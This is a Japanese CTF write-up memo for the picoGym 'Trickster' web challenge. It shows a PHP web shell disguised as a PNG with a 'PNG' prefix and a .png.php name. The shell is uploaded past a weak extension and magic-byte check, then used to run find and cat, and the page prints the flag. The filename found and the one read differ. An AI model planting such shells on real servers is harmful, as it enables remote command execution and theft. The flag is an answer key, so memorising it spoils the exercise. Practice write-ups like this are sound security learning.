+++
author = "Hugo Authors"
title = "picoGym memo"
date = "2025-01-30"
description = ""
tags = [
    "CTF",
    "writeup",
    "picoGym",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/srdnlen-ctf-2025/cover.png"
+++

常設のpicoGymに取り組んだ内容をメモしておく．
<!--more-->

## Web Exploitation
### Trickster
> I found a web app that can help process images: PNG images only!

アクセスすると，PNGファイルをアップロードできるフォームがある．
`/robots.txt`へアクセスすると，
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
とあり，`/instructions.txt`にアクセスすると，
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
とある．以上をまとめると，アップロードしたPNGファイルは`/uploads/`に置かれ，
PNGファイルの判別は，ファイル先頭の'PNG'の文字でのみ行っていると考えられる．  
したがって，PNGファイルとして偽装したphpファイルを置くことが出来そうである．  
以下の`main.png.php`ファイルを作成し，アップロードする．
{{< code lang="php" title="main.png.php" hl_lines="" >}}
PNG
<pre><?php system($_GET["cmd"]);?></pre>
{{< /code >}}

そして，`/uploads/main.png.php?cmd=find / -name '*.txt'`にアクセスする．  
すると`/var/www/html/GQ4DOOBVMMYGK.txt`というファイルを発見．
```
PNG
/usr/lib/python3.9/LICENSE.txt
/usr/local/lib/php/.channels/.alias/pear.txt
/usr/local/lib/php/.channels/.alias/pecl.txt
/usr/local/lib/php/.channels/.alias/phpdocs.txt
/usr/local/lib/php/doc/Archive_Tar/docs/Archive_Tar.txt
/usr/share/perl/5.32.1/Unicode/Collate/allkeys.txt
/usr/share/perl/5.32.1/Unicode/Collate/keys.txt
/usr/share/perl/5.32.1/unicore/Blocks.txt
/usr/share/perl/5.32.1/unicore/NamedSequences.txt
/usr/share/perl/5.32.1/unicore/SpecialCasing.txt
/var/www/html/GQ4DOOBVMMYGK.txt
/var/www/html/instructions.txt
/var/www/html/robots.txt
```
`/uploads/main.png.php?cmd=cat /var/www/html/MFRDAZLDMUYDG.txt`へアクセスすると，flagが得られる．
```
PNG
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} */
```

